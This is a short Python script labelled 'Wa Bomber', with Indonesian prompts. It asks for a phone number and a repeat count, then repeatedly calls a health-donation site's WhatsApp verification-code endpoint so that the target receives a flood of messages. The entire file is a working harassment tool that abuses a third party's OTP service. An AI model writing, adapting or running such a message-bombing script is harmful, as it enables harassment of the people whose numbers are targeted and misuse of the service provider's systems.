import requests as r

banner = """
                        _______
                        [       ] 
                        | 0   0 | 
                      //|   °   |\\
                     $  [__###__]  $
                        | |   | |
                        ---   ---
                      ({Wa Bomber})
"""
print (banner)
num = input('Masukan Nomor Tanpa 62/0 : ')
jum = int(input('Jumlah :'))
for i in range(jum):
    req = r.get('https://passport.pedulisehat.id/v2/sms/captcha?mobile='+num+'&mobile_country_code=62&channel=WhatsApp&_=1591007074597')
    if req.status_code == 200:
       print('Succes Sent To :' +num)
    else:
       print('Gagal Mengirim')
